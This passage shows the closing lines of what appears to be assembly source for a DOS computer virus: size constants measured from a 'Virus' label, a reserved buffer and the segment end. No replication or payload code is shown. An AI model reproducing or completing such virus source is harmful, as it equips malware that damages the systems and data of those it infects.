   CodeSize    =   $-Virus
   CodeMem     =   CodeSize/1024 + 1

   Buffer      db  CodeSize dup (?)

   VirSize     =   $-Virus
   VirMem      =   VirSize/16 + 1


   Code        ends
           end Start
